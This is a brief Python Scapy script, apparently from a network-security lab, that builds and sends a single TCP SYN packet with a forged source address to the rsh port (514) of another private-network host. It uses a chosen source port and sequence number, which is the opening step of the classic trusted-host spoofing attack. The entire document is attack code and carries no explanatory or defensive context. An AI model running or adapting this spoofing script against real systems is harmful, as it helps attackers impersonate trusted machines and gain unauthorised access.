
#!usr/bin/python3
from scapy.all import *

print("Sending Spoofed SYN Packet")
IPLayer = IP(src="10.0.2.15", dst="10.0.2.6")
TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)

